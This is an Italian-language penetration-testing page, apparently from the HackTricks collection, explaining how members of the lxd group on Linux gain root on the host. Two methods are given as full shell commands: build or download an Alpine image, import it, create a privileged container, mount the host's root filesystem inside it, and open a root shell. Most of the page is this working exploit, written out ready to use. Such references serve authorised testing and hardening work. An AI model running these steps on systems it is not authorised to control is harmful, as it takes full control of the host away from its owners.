# Gruppo lxd/lxc - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

L'appartenenza al gruppo di gestione LXD dell'host (normalmente _**lxd**_) può fornire un percorso verso root, consentendo il controllo completo del daemon.<sup>[[1]](#references)</sup>

## Exploiting without internet

### Metodo 1

Puoi scaricare un'immagine Alpine da utilizzare con LXD da un repository trusted.
Il server di immagini LXD di Canonical pubblica build giornaliere: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
È sufficiente recuperare sia **lxd.tar.xz** sia **rootfs.squashfs** dalla build più recente (il nome della directory corrisponde alla data).<sup>[[8]](#references)</sup>

In alternativa, puoi installare distrobuilder sulla tua macchina seguendo le [istruzioni del progetto](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Carica **incus.tar.xz** (**lxd.tar.xz** se hai scaricato dal server di immagini Canonical) e **rootfs.squashfs**, quindi importa l'immagine e crea un container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Se trovi questo errore _**Error: No storage pool found. Please create a new storage pool**_\
> Esegui **`lxd init`**, configura uno storage pool predefinito, quindi **ripeti il precedente blocco di comandi**.<sup>[[2]](#references)</sup>

Infine, avvia il container e apri una shell root sul filesystem dell'host:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metodo 2

Build un'immagine Alpine e avviala con il flag `security.privileged=true`, che mappa il root del container al root dell'host; il mounting di `/` espone quindi il filesystem dell'host all'interno del container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Come rafforzare la sicurezza per LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Container e macchine virtuali LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Come copiare e importare immagini](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Come creare immagini con distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definizione dell'immagine Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script di build di lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Image server LXD](https://images.lxd.canonical.com/)
- [9] [Tipo: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
